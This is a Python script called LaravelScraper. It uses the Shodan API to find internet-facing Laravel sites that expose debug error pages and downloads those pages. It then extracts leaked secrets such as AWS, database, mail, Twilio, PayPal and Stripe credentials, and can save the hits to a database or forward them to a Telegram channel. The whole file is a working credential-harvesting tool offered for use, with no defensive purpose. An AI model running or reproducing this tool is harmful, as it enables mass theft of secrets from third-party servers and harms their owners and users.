# TRANS FOX GIRL RIGHTS :P

import argparse
import datetime
import os
import requests
import re
import pyfiglet
import urllib3
import sys
import socket
from helper import scraper as app
from bs4 import BeautifulSoup
from contextlib import redirect_stdout

#from test import read_txt_file

SHODAN_API_KEY = None
folder_name = None

def bannerner_print():
    figlet_banner = pyfiglet.figlet_format("LARAVELSCRAPER", font='standard')
    term_width = os.get_terminal_size().columns
    figlet_banner = pyfiglet.figlet_format("LARAVELSCRAPER", font='standard', width=term_width)
    print()
    print(figlet_banner)
    print("=== Scrape Laravel error pages using the Shodan API and extract valuable information! ===")
    print("                      === By Lodzie Kotekya (axylisdead) ===")
    print()

def print_help_menu():
    print("LaravelScraper (by Lodzie Kotekya)")
    print("A script to scrape Laravel error pages using the Shodan API and extract valuable information.")
    print("Arguments:")
    print("-k or --api_key (REQUIRED) = Your Shodan API (k)ey. You need one for this to work.")
    print("-p or --page = (P)age. Determines the page of your results as Shodan only downloads 100 at a time.")
    print("-o or --output = (O)utput. Print everything on the console to a file of your choice.")
    print("-t or --telegragm = (T)sends to your telegragm channel, also activate the -d option.")


def search_shodan(page=1):
    global SHODAN_API_KEY
    parser = argparse.ArgumentParser(description="LaravelScraper (by Lodzie Kotekya)")
    parser.add_argument("-k", "--api_key", help="(REQUIRED) Your Shodan API (k)ey. You need one for this to work.", required=True)
    parser.add_argument("-p", "--page", type=int, default=1, help="Determines the page of your results as Shodan only downloads 100 at a time.")
    parser.add_argument("-o", "--output", help="Print everything on the console to a file of your choice.", default=None)
    parser.add_argument("-d", "--database", help="Saves the data into a sqlite db", default=None)
    parser.add_argument("-t","--telegragm", nargs=2, metavar=("token", "chatid"), help="Sends hits to your telegragm channel, also activate the -d option.")
    args = parser.parse_args()

    SHODAN_API_KEY = args.api_key
    headers = {"Authorization": f"Bearer {SHODAN_API_KEY}"}
    query = 'http.title:"Whoops! There was an error" http.status:500'

    try:
        if not args.telegragm is None:
            if args.database is None:
                print(f" ********          Telegragm Error: Also activate the -d switch to use this feature     ***************")
                sys.exit(1)
            if not len(args.telegragm) == 2:
                print("**********          Telegragm Error: example -t Token chat-id.     ***************")
                sys.exit(1)
                
        # maybe this should be 'how many pages?' then loop through them as --all is a pain?
        if args.page > 1:
            woofwoofwoofbarkbarkbark = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={query}&page={args.page}")
        else:
            woofwoofwoofbarkbarkbark = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={query}")
        results = woofwoofwoofbarkbarkbark.json()
        print(f"Shodan Results: {results['total']}")

        return results, args.output, args.database, args.telegragm, results['matches']
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to Shodan API: {e}")
        sys.exit(1)

""" def main():
    bannerner_print()
    results, output_file, database = search_shodan()

    if database:
        file_name = "results.txt"
        rawdata = read_txt_file(file_name)
        db_file_name = "data.db"
        # create json file with output data
        hits = app.sortdata(rawdata)
        sent2db = app.data2db(hits, db_file_name)
        print("\n\033[0m[+] The results have been into the db")
    
    if output_file:
        with open(output_file, "w") as output:
            matches = results['matches']
            dacoolfile = download_ip_ports(matches)
            download_html_files(dacoolfile)
            with redirect_stdout(output):
                extract_information()
        print("\n\033[0m[+] The results have been saved to", output_file)

    else:
        dacoolfile = download_ip_ports(results['matches'])
        download_html_files(dacoolfile)
        extract_information()

    reset_terminal_color()
 """
def download_ip_ports(matches):
    dt = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"laravelscraper_{dt}.txt"

    num_results = len(matches)
    print(f"Downloading: {num_results}")
    print()

    with open(filename, "w") as file:
        for match in matches:
            ip = match["ip_str"]
            port = match["port"]
            file.write(f"{ip}:{port}\n")

    print(f"Writing to: {filename}")
    return filename

def download_html_files(filename):
    with open(filename, "r") as file:
        ip_ports = file.read().splitlines()

    global folder_name
    folder_name = f"laravelscraper_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(folder_name, exist_ok=True)

    for ip_port in ip_ports:
        ip_port = ip_port.strip()
        if not ip_port:
            continue
        # Handle IPV6 gracefully
        ip_details = app.ipdetails(ip_port)
        if ip_details:
            ip = ip_details[0]
            port = ip_details[1]
        else:
            continue
        url = f"http://{ip}:{port}"
        html_filename = os.path.join(folder_name, f"{ip}.html")

        urllib3.disable_warnings()
        try:
            woofwoofwoofbarkbarkbark = requests.get(url, verify=False, timeout=10)
            with open(html_filename, "w", encoding="utf-8") as html_file:
                html_file.write(woofwoofwoofbarkbarkbark.text)
            print(f"Downloaded: {html_filename}")
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError):
            print(f"Skipped: {url} (Timeout/ConnectionError)")
        except requests.exceptions.ReadTimeout:
            print(f"Skipped: {url} (ReadTimeout)")
        except Exception as e:
            print(f"Error occurred while processing {url}: {e}")

def resolve_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return None

def extract_information():
    ip_info = {}
    processed_ips = set()

    for filename in os.listdir(folder_name):
        if filename.endswith(".html"):
            with open(os.path.join(folder_name, filename), "r", encoding="utf-8") as file:
                content = file.read()

            keywords = ["AWS", "DB", "MAIL", "TWILIO", "PAYPAL", "STRIPE", "RDS"]
            soup = BeautifulSoup(content, "html.parser")

            ip_without_extension = os.path.splitext(filename)[0]
            if ip_without_extension not in ip_info:
                ip_info[ip_without_extension] = set()

            for keyword in keywords:
                pattern = re.compile(rf"{keyword}_\w*", re.IGNORECASE)
                results = soup.find_all(string=pattern)

                if results:
                    for result in results:
                        parent_td = result.find_parent("td")
                        if parent_td is None:
                            continue
                        next_sibling_td = parent_td.find_next_sibling("td")
                        if next_sibling_td is None:
                            continue
                        span_content = next_sibling_td.find("span", class_="sf-dump-str")
                        if span_content is None or not span_content.string.strip():
                            continue
                        if "*" in span_content.string or span_content.string.strip().lower() == "null":
                            continue
                        keyword_name = parent_td.text.strip()
                        ip_info[ip_without_extension].add((keyword_name, span_content.string.strip()))

    for ip, info in ip_info.items():
        if not info or ip in processed_ips:
            continue

        processed_ips.add(ip)
        hostname = resolve_hostname(ip)
        print()
        if sys.stdout.isatty():
            print(f"\033[0m{ip}{' (' + hostname + ')' if hostname else ''}:")
        else:
            print(f"{ip}{' (' + hostname + ')' if hostname else ''}:")
        for keyword, value in info:
            if sys.stdout.isatty():
                print(f"\033[92m[+] {keyword}: {value}")
            else:
                print(f"[+] {keyword}: {value}")

def reset_terminal_color():
    print("\033[0m", end="")

def main():
    bannerner_print()
    results, output_file, database, send2tele, matches = search_shodan()
        
    if output_file:
        with open(output_file, "w") as output:
            dacoolfile = download_ip_ports(matches)
            download_html_files(dacoolfile)
            with redirect_stdout(output):
                extract_information()
        print("\n\033[0m[+] The results have been saved to", output_file)
        
    if database:
        db_file_name = "data.db"
        hits = app.sortdata(output_file)
        sent2db = app.data2db(hits, db_file_name)
        print("\n\033[0m[+] The results have been into the database")
    
    if send2tele:
        app.send2tele(send2tele[0],send2tele[1])
    
    else:
        dacoolfile = download_ip_ports(matches)
        download_html_files(dacoolfile)
        extract_information()

    reset_terminal_color()

if __name__ == "__main__":
    main()
